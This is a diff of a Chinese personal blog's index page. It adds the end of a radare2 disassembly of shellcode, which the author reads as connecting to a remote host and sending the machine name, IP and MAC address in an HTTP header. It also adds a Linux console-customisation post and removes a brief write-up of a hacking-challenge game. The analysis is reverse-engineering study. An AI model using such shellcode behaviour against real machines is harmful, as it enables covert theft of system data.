+|          ; JMP XREF from <span class="number">0x00000141</span> (fcn<span class="number">.00000090</span>)
+|          ; JMP XREF from <span class="number">0x00000189</span> (fcn<span class="number">.00000090</span>)
+|          ; JMP XREF from <span class="number">0x00000197</span> (fcn<span class="number">.00000090</span>)
+|          ; JMP XREF from <span class="number">0x000001cb</span> (fcn<span class="number">.00000090</span>)
+|          ;-- closesocket:
+|          <span class="number">0x00000239</span>    <span class="number">53</span>           push ebx
+</code></pre><p>显然将报头send出去了。</p>
+<p>最后，关闭socket连接。然后跳回<code>0x10e</code>构造报头然后崩溃……</p>
+<pre><code>[<span class="number">0x00000252</span>]&gt; pd <span class="number">10</span>@<span class="number">0x00000239</span>
+|      |   ; JMP XREF from <span class="number">0x00000141</span> (fcn<span class="number">.00000090</span>)
+|      |   ; JMP XREF from <span class="number">0x00000189</span> (fcn<span class="number">.00000090</span>)
+|      |   ; JMP XREF from <span class="number">0x00000197</span> (fcn<span class="number">.00000090</span>)
+|      |   ; JMP XREF from <span class="number">0x000001cb</span> (fcn<span class="number">.00000090</span>)
+|      |   ;-- closesocket:
+|      |   <span class="number">0x00000239</span>    <span class="number">53</span>           push ebx
+|      |   <span class="number">0x0000023a</span>    <span class="number">68756e4</span>d61   push <span class="number">0x614d6e75</span> ;  <span class="number">0x614d6e75</span> 
+|      |   <span class="number">0x0000023f</span>    ffd5         call ebp
+|      |      fcn<span class="number">.00000000</span>(unk, unk, unk)
+\      `=&lt; <span class="number">0x00000241</span>    e9c8feffff   jmp <span class="number">0x10e</span> ; (fcn<span class="number">.00000090</span>)
+</code></pre><p>至此这个shellcode大致做了什么就比较清晰了。与远程主机建立连接，将计算机的机器名获取，又获取IP地址和MAC地址，然后构造HTTP报头发送给远端的机器。</p>
+<p>要更加清晰的知道shellcode在干什么，最好还是动态方式调试下。当然得写个测试shellcode的程序了，好像radare2有调试功能……不会用，唉，标记都用不好。</p>
+
+            
+          </span>
+        
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/linux/2014/08/08/better-and-beautiful-console/" itemprop="url">
+                  Better and Beautiful Console
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            发表于
+            <time itemprop="dateCreated" datetime="2014-08-08T00:00:00+08:00" content="2014-08-08">
+              2014-08-08
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp; 分类于
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/linux/" itemprop="url" rel="index">
+                    <span itemprop="name">linux</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+              &nbsp; | &nbsp;
+              <a href="/linux/2014/08/08/better-and-beautiful-console/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="linux/2014/08/08/better-and-beautiful-console/" itemprop="commentsCount"></span>
+              </a>
+            </span>
+            
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body">
+
+      
+      
+
+      
+        
+          <span itemprop="articleBody">
+            
+              <p>一般的linux控制台（这还是gentoo配置过的默认bash呢）是这样的</p>
+<p><img src="/images/plainconsole.png" alt="普通控制台"></p>
+<p>而经过一番简单的配置之后，你的控制台是这样的</p>
+<p><img src="/images/fbterm.png" alt="fbterm"></p>
+<hr>
+<h2 id="如何美化Linux下控制台（Better_Framebuffer）">如何美化Linux下控制台（Better Framebuffer）</h2><p>如果你运气足够好，碰上个有良心的发行版会帮你稍微配置下bash，增加些显示当前目录啊、彩色输出啊的功能。如果你足够悲剧，选择了一个以KISS为目标的发行版或者碰到一个无良发行版，你的bash就是个勉强能用的悲剧。</p>
+<p>为了让终端在即使没有X也能漂亮起来，为了更加愉快的在没有X的Server下工作，为了不装X胜似装X。让我们开始配置一个漂亮的Linux控制台吧。</p>
+<p>我是在gentoo linux完成配置的，首先安装必要的程序：</p>
+<pre><code>emerge fbterm fcitx-fbterm fbv fbdump zsh oh-<span class="keyword">my</span>-zsh gpm
+</code></pre><h2 id="zsh">zsh</h2><p>1.把zsh改成默认shell</p>
+<pre><code>chsh <span class="operator">-s</span> zsh
+</code></pre><p>2.修改zsh主题</p>
+<pre><code><span class="setting">ZSH_THEME=<span class="value"><span class="string">"agnoster"</span></span></span>
+</code></pre><p>至此，zsh配置完成。</p>
+<h2 id="fbterm背景图片">fbterm背景图片</h2><p>3.为了让fbterm显示背景图像，建立一个比如说<code>.background_fbterm</code>作为fbterm启动的封装</p>
+<pre><code> ~ ⮀ cat .background_fbterm
+<span class="shebang">#!/bin/bash</span>
+<span class="comment"># fbterm-bi: a wrapper script to enable background image with fbterm</span>
+<span class="comment"># usage: fbterm-bi /path/to/image fbterm-options</span>
+<span class="built_in">echo</span> <span class="operator">-ne</span> <span class="string">"\e[?25l"</span> <span class="comment"># hide cursor</span>
+fbv -ciuker <span class="string">"<span class="variable">$1</span>"</span> &lt;&lt; EOF
+</code></pre><p>q<br>    EOF<br>    shift<br>    export FBTERM_BACKGROUND_IMAGE=1<br>    exec fbterm “$@”</p>
+<ol>
+<li><p>在<code>.zshrc</code>中添加一个别名，指定背景图片。</p>
+<h1 id="fbterm">fbterm</h1><p> alias fbterm=”sh ~/.background_fbterm ~/Pictures/wallpaper/girl.png”</p>
+</li>
+</ol>
+<h2 id="中文输入法">中文输入法</h2><ol>
+<li><p>在<code>.fbtermrc</code>中写入以下行，提供framebuffer下的中文输入法。</p>
+<h1 id="specify_the_favorite_input_method_program_to_run">specify the favorite input method program to run</h1><p> input-method=fcitx-fbterm</p>
+<h2 id="鼠标支持">鼠标支持</h2></li>
+</ol>
+<p>你会迷恋上中键粘帖的。</p>
+<hr>
+<p>看到没有，简单5步，即使没有X，一个漂亮、高效、支持中文显示和输入的控制台就诞生了。</p>
+<p>ps:关于终端截图。<code>fbgrab</code>获取的图像错位，</p>
+<p>即使多次尝试w和h：</p>
+<pre><code>cat /dev/fb0 &gt; fb<span class="class">.raw</span>
+fbgrab -<span class="tag">i</span> -w <span class="number">1056</span> -h <span class="number">1024</span> -<span class="tag">b</span> <span class="number">32</span> -f framebuffer<span class="class">.raw</span> fb.png
+</code></pre><p>获取的也是错位的图像。</p>
+<p>后来编译个<code>fbdump</code>挺好用的。</p>
+<pre><code><span class="tag">fbdump</span> &gt; <span class="tag">fb</span><span class="class">.ppm</span>
+</code></pre><p>然后用gimp啊等转成其它格式就随意了</p>
+<pre><code><span class="tag">gimp</span> <span class="tag">fb</span><span class="class">.ppm</span>
+</code></pre>
+            
+          </span>
+        
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
                 <a class="post-title-link" href="/exploit/2014/08/08/defeating-ioli-with-radare2/" itemprop="url">
                   Defeating ioli with radare2
                 </a>
@@ -1593,152 +2379,6 @@ Password OK!
 </ul>
 <p>I find an interesting book: RE-for-beginers</p>
 
-            
-          </span>
-        
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/linux/2014/08/08/better-and-beautiful-console/" itemprop="url">
-                  Better and Beautiful Console
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            发表于
-            <time itemprop="dateCreated" datetime="2014-08-08T00:00:00+08:00" content="2014-08-08">
-              2014-08-08
-            </time>
-          </span>
-
-          
-            <span class="post-category" >
-              &nbsp; | &nbsp; 分类于
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/linux/" itemprop="url" rel="index">
-                    <span itemprop="name">linux</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-              &nbsp; | &nbsp;
-              <a href="/linux/2014/08/08/better-and-beautiful-console/#comments" itemprop="discussionUrl">
-                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="linux/2014/08/08/better-and-beautiful-console/" itemprop="commentsCount"></span>
-              </a>
-            </span>
-            
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body">
-
-      
-      
-
-      
-        
-          <span itemprop="articleBody">
-            
-              <p>一般的linux控制台（这还是gentoo配置过的默认bash呢）是这样的</p>
-<p><img src="/images/plainconsole.png" alt="普通控制台"></p>
-<p>而经过一番简单的配置之后，你的控制台是这样的</p>
-<p><img src="/images/fbterm.png" alt="fbterm"></p>
-<hr>
-<h2 id="如何美化Linux下控制台（Better_Framebuffer）">如何美化Linux下控制台（Better Framebuffer）</h2><p>如果你运气足够好，碰上个有良心的发行版会帮你稍微配置下bash，增加些显示当前目录啊、彩色输出啊的功能。如果你足够悲剧，选择了一个以KISS为目标的发行版或者碰到一个无良发行版，你的bash就是个勉强能用的悲剧。</p>
-<p>为了让终端在即使没有X也能漂亮起来，为了更加愉快的在没有X的Server下工作，为了不装X胜似装X。让我们开始配置一个漂亮的Linux控制台吧。</p>
-<p>我是在gentoo linux完成配置的，首先安装必要的程序：</p>
-<pre><code>emerge fbterm fcitx-fbterm fbv fbdump zsh oh-<span class="keyword">my</span>-zsh gpm
-</code></pre><h2 id="zsh">zsh</h2><p>1.把zsh改成默认shell</p>
-<pre><code>chsh <span class="operator">-s</span> zsh
-</code></pre><p>2.修改zsh主题</p>
-<pre><code><span class="setting">ZSH_THEME=<span class="value"><span class="string">"agnoster"</span></span></span>
-</code></pre><p>至此，zsh配置完成。</p>
-<h2 id="fbterm背景图片">fbterm背景图片</h2><p>3.为了让fbterm显示背景图像，建立一个比如说<code>.background_fbterm</code>作为fbterm启动的封装</p>
-<pre><code> ~ ⮀ cat .background_fbterm
-<span class="shebang">#!/bin/bash</span>
-<span class="comment"># fbterm-bi: a wrapper script to enable background image with fbterm</span>
-<span class="comment"># usage: fbterm-bi /path/to/image fbterm-options</span>
-<span class="built_in">echo</span> <span class="operator">-ne</span> <span class="string">"\e[?25l"</span> <span class="comment"># hide cursor</span>
-fbv -ciuker <span class="string">"<span class="variable">$1</span>"</span> &lt;&lt; EOF
-</code></pre><p>q<br>    EOF<br>    shift<br>    export FBTERM_BACKGROUND_IMAGE=1<br>    exec fbterm “$@”</p>
-<ol>
-<li><p>在<code>.zshrc</code>中添加一个别名，指定背景图片。</p>
-<h1 id="fbterm">fbterm</h1><p> alias fbterm=”sh ~/.background_fbterm ~/Pictures/wallpaper/girl.png”</p>
-</li>
-</ol>
-<h2 id="中文输入法">中文输入法</h2><ol>
-<li><p>在<code>.fbtermrc</code>中写入以下行，提供framebuffer下的中文输入法。</p>
-<h1 id="specify_the_favorite_input_method_program_to_run">specify the favorite input method program to run</h1><p> input-method=fcitx-fbterm</p>
-<h2 id="鼠标支持">鼠标支持</h2></li>
-</ol>
-<p>你会迷恋上中键粘帖的。</p>
-<hr>
-<p>看到没有，简单5步，即使没有X，一个漂亮、高效、支持中文显示和输入的控制台就诞生了。</p>
-<p>ps:关于终端截图。<code>fbgrab</code>获取的图像错位，</p>
-<p>即使多次尝试w和h：</p>
-<pre><code>cat /dev/fb0 &gt; fb<span class="class">.raw</span>
-fbgrab -<span class="tag">i</span> -w <span class="number">1056</span> -h <span class="number">1024</span> -<span class="tag">b</span> <span class="number">32</span> -f framebuffer<span class="class">.raw</span> fb.png
-</code></pre><p>获取的也是错位的图像。</p>
-<p>后来编译个<code>fbdump</code>挺好用的。</p>
-<pre><code><span class="tag">fbdump</span> &gt; <span class="tag">fb</span><span class="class">.ppm</span>
-</code></pre><p>然后用gimp啊等转成其它格式就随意了</p>
-<pre><code><span class="tag">gimp</span> <span class="tag">fb</span><span class="class">.ppm</span>
-</code></pre>
             
           </span>
         
@@ -3997,127 +4637,6 @@ Reading symbols <span class="built_in">from</span> /home/lyy/Work/msp430/main.el
 
 
     
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/life/2014/05/04/360-hack-game/" itemprop="url">
-                  360 Hack game网络攻防
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            发表于
-            <time itemprop="dateCreated" datetime="2014-05-04T00:00:00+08:00" content="2014-05-04">
-              2014-05-04
-            </time>
-          </span>
-
-          
-            <span class="post-category" >
-              &nbsp; | &nbsp; 分类于
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/life/" itemprop="url" rel="index">
-                    <span itemprop="name">life</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-              &nbsp; | &nbsp;
-              <a href="/life/2014/05/04/360-hack-game/#comments" itemprop="discussionUrl">
-                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="life/2014/05/04/360-hack-game/" itemprop="commentsCount"></span>
-              </a>
-            </span>
-            
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body">
-
-      
-      
-
-      
-        
-          <span itemprop="articleBody">
-            
-              <p>不知道把这篇文章归入哪一类，那就life吧。Hack也是life的一部分吧。</p>
-<p>最开始是见有人在论坛上问第三道解码的题目。然后lz给出了个地址，就去看了看。后来还挺好玩，就继续做下去了。</p>
-<p>没必要在这里披露什么答案，<a href="http://bbs.blackbap.org/thread-5800-1-1.html" target="_blank" rel="external">习科</a>和<a href="http://www.freebuf.com/articles/web/33145.html" target="_blank" rel="external">FreeBuf</a>上已经有详细解答参考答案。就随便记下个人解题过程。</p>
-<p>第一关没什么压力。一看就知道显然是更改refer。</p>
-<p>第二关，习惯性打开js文件，赫然写着<code>password</code>几个大字。然后就是在浏览器调试工具或者node中跑呗。出题人耍了个小技巧，让结果不返回。反正我当时竟然凭着对js的一点浅薄知识一路复制粘帖用js一层一层解了三次。最后碰到一堆<code>[+&gt;]</code>的东西。我竟然以为是brainfuck，然后把自己电脑跑死机了……后来才忽然感觉是js，复制运行得到结果。</p>
-<p>第三关，一不小心在论坛上看到结果了，不过这显然对我不是什么问题。</p>
-<p>第四关，发了好久呆。不了解jpg文件格式，用vim打开也没看出什么。后来发现vim打开二进制文件必须加<code>-b</code>参数。再后来在论坛上其他人的提醒下发现竟然是两幅图。光看文件大小真看不出来。</p>
-<p>第五关，最简单有没有。虽然不知道都是些什么，全靠百度得来答案。。。是的，百度，谷歌都没用上。</p>
-<p>第六关，试了<code>~</code>后缀，最后论坛上有人提醒是vi……真是丧心病狂……</p>
-<p>第七关，还是仰仗论坛上提醒要大小写，又这么一碰竟然过了。然后128位的哈希一看就是md5,直接google得到结果。</p>
-<p>第八关，代码审计给跪了，php完全不会。考虑暴力穷举感觉尝试量太大，后来见论坛上有人穷举出来了……于是也随手写了个小程序穷举起来。最后论坛上其它人用我的程序穷举出来了我还没穷举出来……</p>
-<p>第九关，对着习科上答案来的……可能网络太差吧，等了好久。</p>
-<p>第十关，对着参考答案来，可每次文件名都变化。看到32字节长的文件名，就想是不是报头中某个变化的东西比如时间的md5？结果愣是没看出来cookie过期了。还抓了上千个哈希试图破解，却发现只有在cmd5可以找到，还是付费内容。写了个小脚本跑字典，也没解出来文件名到底怎么来的。算了，仰仗论坛上大婶的指点，反正过了。</p>
-<p>接下来我想写几样东西：</p>
-<ul>
-<li>关于扫描器的原理与实现</li>
-<li>某次抓取DVS/DVR信息的过程</li>
-<li>ftp搜索引擎</li>
-</ul>
-
-            
-          </span>
-        
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
 
   </section>
 
@@ -4164,7 +4683,7 @@ Reading symbols <span class="built_in">from</span> /home/lyy/Work/msp430/main.el
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">175</span>
+              <span class="site-state-item-count">176</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
@@ -4178,7 +4697,7 @@ Reading symbols <span class="built_in">from</span> /home/lyy/Work/msp430/main.el
 
           <div class="site-state-item site-state-tags">
             <a href="/tags">
-              <span class="site-state-item-count">61</span>
+              <span class="site-state-item-count">62</span>
               <span class="site-state-item-name">标签</span>
               </a>
           </div>
@@ -4298,7 +4817,7 @@ Reading symbols <span class="built_in">from</span> /home/lyy/Work/msp430/main.el
         <div class="copyright" >
   
   &copy;  2011 - 
-  <span itemprop="copyrightYear">2015</span>
+  <span itemprop="copyrightYear">2016</span>
   <span class="with-love">
     <i class="icon-next-heart fa fa-heart"></i>
   </span>
